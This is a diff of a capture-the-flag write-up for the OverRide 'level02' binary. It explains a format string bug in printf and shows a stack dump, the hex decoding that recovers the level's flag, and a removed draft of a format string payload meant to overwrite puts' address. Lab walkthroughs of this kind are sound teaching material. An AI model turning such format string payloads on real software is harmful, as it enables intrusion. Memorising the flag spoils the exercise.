@@ -23,7 +23,7 @@ Dump of assembler code for function main:
    0x0000000000400830 <+28>:     mov    eax,0x0
    0x0000000000400835 <+33>:     mov    ecx,0xc
    0x000000000040083a <+38>:     mov    rdi,rdx
-   0x000000000040083d <+41>:     rep stos QWORD PTR es:[rdi],rax
+   0x000000000040083d <+41>:     rep stos QWORD PTR es:[rdi],rax            ; memset(buf_user, '\0', 12)
    0x0000000000400840 <+44>:     mov    rdx,rdi
    0x0000000000400843 <+47>:     mov    DWORD PTR [rdx],eax
    0x0000000000400845 <+49>:     add    rdx,0x4
@@ -31,7 +31,7 @@ Dump of assembler code for function main:
    0x0000000000400850 <+60>:     mov    eax,0x0
    0x0000000000400855 <+65>:     mov    ecx,0x5
    0x000000000040085a <+70>:     mov    rdi,rdx
-   0x000000000040085d <+73>:     rep stos QWORD PTR es:[rdi],rax
+   0x000000000040085d <+73>:     rep stos QWORD PTR es:[rdi],rax            ; memset(buf_file, '\0', 5)
    0x0000000000400860 <+76>:     mov    rdx,rdi
    0x0000000000400863 <+79>:     mov    BYTE PTR [rdx],al
    0x0000000000400865 <+81>:     add    rdx,0x1
@@ -39,7 +39,7 @@ Dump of assembler code for function main:
    0x0000000000400870 <+92>:     mov    eax,0x0
    0x0000000000400875 <+97>:     mov    ecx,0xc
    0x000000000040087a <+102>:    mov    rdi,rdx
-   0x000000000040087d <+105>:    rep stos QWORD PTR es:[rdi],rax
+   0x000000000040087d <+105>:    rep stos QWORD PTR es:[rdi],rax            ; memset(buf_pass, '\0', 12)
    0x0000000000400880 <+108>:    mov    rdx,rdi
    0x0000000000400883 <+111>:    mov    DWORD PTR [rdx],eax
    0x0000000000400885 <+113>:    add    rdx,0x4
@@ -169,10 +169,68 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
+Basically, this program opens the `.pass` file that contains the flag we look for, put its content to a buffer declared on stack, gets a username and a password from the standard input, then spawn a shell if the password entered by the user is equal to the `.pass` file content.
+
+The first clue we get from this is that the flag is stored in a buffer on the stack, so maybe we can find a way to read this buffer.
+
+Here, the vulnerability comes from `printf` which is called at the end of the program, when the password provided is different from the one of `.pass`, and only takes one argument, the username coming from the standard input. We will use a python script ('Ressources' folder attached) to dump the stack thanks to a format string attack. By doing so, we hope to reach the buffer used to read the content of the `.pass` file. Let's try this !
+
 ## Exploit
 
-piste : utiliser le printf(buf_user) pour reecrire l'addresse de puts() avec un shellcode dans l'env
+```console
+level02@OverRide:~$ python /tmp/dump_stack.py
+Segmentation fault (core dumped)                ; we reach the top of the stack
+Segmentation fault (core dumped)                ; so the following trials
+Segmentation fault (core dumped)                ; are out of bounds
+Segmentation fault (core dumped)                ; and make the program crashes
+[...]
+level02@OverRide:~$ cat /tmp/level02_dump
+=== 1 : 7fffffffe4d0 does not have access!
+=== 2 : 0 does not have access!
+=== 3 : 0 does not have access!
+=== 4 : 2a2a2a2a2a2a2a2a does not have access!
+=== 5 : 2a2a2a2a2a2a2a2a does not have access!
+=== 6 : 7fffffffe6c8 does not have access!
+=== 7 : 1f7ff9a08 does not have access!
+=== 8 : 0 does not have access!
+=== 9 : 0 does not have access!
+=== 10 : 0 does not have access!
+=== 11 : 0 does not have access!
+=== 12 : 0 does not have access!
+=== 13 : 0 does not have access!
+=== 14 : 0 does not have access!
+=== 15 : 0 does not have access!
+=== 16 : 0 does not have access!
+=== 17 : 0 does not have access!
+=== 18 : 0 does not have access!
+=== 19 : 0 does not have access!
+=== 20 : 100000000 does not have access!
+=== 21 : 0 does not have access!
+=== 22 : 756e505234376848 does not have access!
+=== 23 : 45414a3561733951 does not have access!
+=== 24 : 377a7143574e6758 does not have access!
+=== 25 : 354a35686e475873 does not have access!
+=== 26 : 48336750664b394d does not have access!
+=== 27 : 0 does not have access!
+=== 28 : 786c24383225 does not have access!
+=== 29 : 0 does not have access!
+=== 30 : 0 does not have access!
+[...]
+```
 
-python -c 'print "\xe4\x11\x60" + "\xe2\x11\x60" + "\xe0\x11\x60" + "%32758x" + "%1$hn" + "%26817x" + "%3$hn" + "%5951x" + "%2$hn"'
+We take a look at the dumping file and notice a 5 blocks raw wich seems to contain ascii characters (22th to 26th argument). Once again we use python in order to convert the values from hexadecimal to ascii and reverse the bytes of each block, according to the binary endianness.
 
-ecriture en 3 parties de l'addresse du shellcode a l'addresse de puts (segfault mais pas plus d'infos)
+```python
+>>> "756e505234376848".decode("hex")[::-1]
+'Hh74RPnu'
+>>> "45414a3561733951".decode("hex")[::-1]
+'Q9sa5JAE'
+>>> "377a7143574e6758".decode("hex")[::-1]
+'XgNWCqz7'
+>>> "354a35686e475873".decode("hex")[::-1]
+'sXGnh5J5'
+>>> "48336750664b394d".decode("hex")[::-1]
+'M9KfPg3H'
+```
+
+Finally, we join the five string parts to get the flag : "Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H".
